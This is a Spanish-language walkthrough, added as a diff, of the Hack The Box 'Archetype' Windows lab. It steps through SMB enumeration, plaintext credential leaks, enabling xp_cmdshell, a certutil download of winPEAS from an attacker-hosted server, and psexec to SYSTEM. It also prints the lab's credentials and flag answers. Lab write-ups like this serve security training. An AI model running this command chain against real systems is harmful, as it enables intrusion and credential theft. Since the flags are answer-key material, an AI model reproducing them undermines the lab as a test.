@@ -1,0 +1,143 @@
+===========================================
+        HTB - ARCHETYPE (Windows)
+        IP: 10.129.12.20
+===========================================
+ 
+RECONOCIMIENTO - NMAP
+----------------------
+Comando:
+  nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV -oG AllPorts 10.129.12.20
+ 
+PUERTOS ABIERTOS
+-----------------
+- 135   → MSRPC
+- 139   → NetBIOS
+- 445   → SMB (Microsoft Windows Server 2008 R2 - 2012)
+- 1433  → MSSQL (Microsoft SQL Server 2017 14.00.1000)
+- 5985  → WinRM / HTTP (Microsoft HTTPAPI 2.0)
+- 47001 → HTTP (Microsoft HTTPAPI 2.0)
+- 49664-49669 → MSRPC dinámico
+ 
+-------------------------------------------
+PASO 1 - ENUMERACIÓN SMB
+-------------------------------------------
+Listar shares disponibles:
+  smbclient -N -L \\\\10.129.12.20
+ 
+Shares encontrados:
+  - ADMIN$   (administrativo)
+  - C$       (administrativo)
+  - IPC$     (administrativo)
+  - backups  ← NO administrativo (sin $)
+
+aqui hay que recordar que como antes dicho de otras maquinas, los que son con $ son administrativos
+
+
+Acceder al share backups:
+  smbclient -N \\\\10.129.12.20\\backups
+ 
+Dentro del share:
+  smb> ls
+  smb> get prod.dtsConfig
+ 
+Leer el archivo:
+  cat prod.dtsConfig
+ 
+Credenciales encontradas en texto plano:
+  Usuario: ARCHETYPE\sql_svc
+  Password: M3g4c0rp123
+
+filtración de contraseña, despues
+
+-------------------------------------------
+PASO 2 - CONEXIÓN A MSSQL
+-------------------------------------------
+  mssqlclient.py ARCHETYPE/sql_svc@10.129.12.20 -windows-auth
+  Password: M3g4c0rp123
+ 
+-------------------------------------------
+PASO 3 - HABILITAR xp_cmdshell
+-------------------------------------------
+una vez dentro del sistema, la ejecucion de comandos es con 
+
+xp_cmdshell
+
+Dentro de mssqlclient:
+  EXEC sp_configure 'show advanced options', 1;
+  RECONFIGURE;
+  EXEC sp_configure 'xp_cmdshell', 1;
+  RECONFIGURE;
+ 
+Verificar:
+  xp_cmdshell "whoami"
+    nt service\mssqlserver
+ 
+-------------------------------------------
+PASO 4 - TRANSFERIR Y EJECUTAR WINPEAS
+-------------------------------------------
+En atacante, levantar servidor HTTP:
+  python3 -m http.server 8000
+ 
+Descargar winPEAS en víctima:
+  xp_cmdshell "certutil.exe -urlcache -f http://TU_IP:8000/winPEASany_ofs.exe C:\Users\sql_svc\Downloads\winPEAS.exe"
+ 
+certutil.exe es un servicio para manejar certificados, pero tambien mal intencionadamente puede usarse para saltar la detencion de archivos descargados, raramente funciona igual para descargar archivos, entonces lo ejecutamos con eso y ya
+
+Ejecutar:
+  xp_cmdshell "C:\Users\sql_svc\Downloads\winPEAS.exe"
+ 
+-------------------------------------------
+PASO 5 - ENCONTRAR CREDENCIALES DE ADMIN
+-------------------------------------------
+WinPEAS detecta el historial de PowerShell:
+  C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+ 
+Leer el historial:
+  xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+ 
+Contenido:
+  net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+ 
+Credenciales de admin encontradas:
+  Usuario: administrator
+  Password: MEGACORP_4dm1n!!
+ 
+-------------------------------------------
+PASO 6 - ACCESO COMO ADMINISTRADOR (psexec)
+-------------------------------------------
+psexec.pt crea un servicio temporal en la víctima
+y nos da una shell como NT AUTHORITY\SYSTEM
+ 
+  psexec.py Administrator@10.129.12.20
+  Password: MEGACORP_4dm1n!!
+ 
+Verificar:
+  whoami
+   nt authority\system
+ 
+con esto sabemos que somos system32 o root
+
+-------------------------------------------
+PASO 7 - OBTENER FLAGS
+-------------------------------------------
+User flag:
+  type C:\Users\sql_svc\Desktop\user.txt
+ 
+Root flag:
+  type C:\Users\Administrator\Desktop\root.txt
+ 
+-------------------------------------------
+FLAGS
+-------------------------------------------
+  User flag:  3e7b102e78218e935bf3f4951fec21a3
+  Root flag:  b91ccec3305e98240082d4474b848528
+
+debido a que lamentablemente tuve conflictos con un archivo, subo el link del winPEAS
+
+https://github.com/peass-ng/PEASS-ng/releases/tag/20260604-085abf96
+
+
+Easy
+
+PWNED!!! 
+:))
